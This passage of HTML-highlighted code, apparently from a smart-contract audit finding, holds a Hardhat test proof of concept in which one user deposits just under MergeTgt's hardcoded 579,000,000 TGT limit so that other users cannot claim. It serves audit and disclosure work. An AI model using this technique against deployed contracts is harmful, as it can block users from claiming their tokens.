class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003equoteSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Executing the send operation from TITN contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deply MockTGT contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @audit increased total supply above mergeTGT hardcoded 579_000_000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Tgt\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;TGT\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;100000000000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy MergeTgt contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Arbitrum setup\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetTransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetLaunchTime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetLockedStatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// now the admin should deposit all ARB.TITN into the mergeTGT contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;173700000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;173700000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// let\u0026#39;s send some TGT to user1 and user2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @audit send close to 579_000_000 TGT to user1 (just above the mergeTGT hardcoded value)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;578999999\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;General tests\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Users can\u003c/span\u003e\u003cspan class=\"mtk6\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk8\"\u003et claim if more than TGT limit is deposited\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// transfer TGT to the merge contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;578999999\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAndCall\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;578999999\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;100\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAndCall\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;100\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 